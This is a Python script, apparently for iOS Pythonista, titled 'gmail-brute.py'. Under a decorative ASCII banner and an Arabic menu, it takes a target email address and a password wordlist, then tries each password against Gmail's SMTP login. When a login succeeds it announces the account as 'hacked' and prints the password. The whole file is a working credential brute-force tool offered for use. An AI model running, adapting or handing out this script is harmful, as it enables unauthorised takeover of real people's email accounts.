#!/private/var/mobile/Containers/Shared/AppGroup/21EBF106-E531-4A00-B6C8-D7A9962BD59D/Pythonista3/Documents/gmail-brute.py





from __future__ import absolute_import
from __future__ import print_function
from smtplib import SMTP_SSL,SMTPAuthenticationError
from os import system
from six.moves import input
W="\033[0m"
R="\033[91m"
G="\033[92m"
Y="\033[93m"
B="\033[94m"
def main():
  print('==========================================')
  print( '               0xfff0800                  ')
  print('==========================================')
  print('                             ')
  print('\n                                               ')
  print('                                              ')
  print('                                                 ')
  print('                                                 ')
  print( '                                          ')
  print('       _,.                   ')
  print('     ,` -.)                  ')
  print('    ( _/-\\-._               ')
  print('   /,|`--._,-^|            , ')
  print('   \_| |`-._/||          , | ')
  print('     |  `-, / |         /  / ')
  print('     |     || |        /  /  ')
  print('      `r-._||/   __   /  /   ')
  print('  __,-<_     )`-/  `./  /    ')
  print('  \   `---    \   / /  /     ')
  print('     |           |./  /      ')
  print('     /           //  /       ')
  print(' \_/  \         |/  /        ')
  print('  |    |   _,^- /  /         ')
  print('  |    , ``  (\/  /_         ')
  print('   \,.->._    \X-=/^         ')
  print('   (  /   `-._//^`           ')
  print('    `Y-.____(__}             ')
  print('     |     {__)              ')
  print('              ''snap:flaah999   ')

main()
print('[1] ''كسر كلمة المرور للاميل')
print('[2] ''خروج')
option = eval(input('==>'))
if option == 1:
	email=input('ادخل الاميل :')
	file_path = input('مجلد الباسبورد :')
	passlist= open(file_path,'r').readlines()
	print(W+" number of passwords : "+B+str(len(passlist))+W)
else:
   system('clear')
   exit()
server=SMTP_SSL("smtp.gmail.com",465)
server.ehlo()
i=0
for pw in passlist:
	i+=1
	try:
		server.login(email,pw)
		system('clear')
		print("تم اختراق الحساب رمز :"+pw)
		print('المطور : فلاح العنزي')
		print("\n^_^")
		break
	except SMTPAuthenticationError as e:
		if "534" in str(e):
			system('clear')
			print("تم اختراق الحساب رمز :"+pw)
			print('المطور : فلاح العنزي')
			print("\n^_^")
			break
		else:
			print(Y+str(i*100/len(passlist))+"%"+W+"/ خطاء الرمز :"+pw)

server.close()
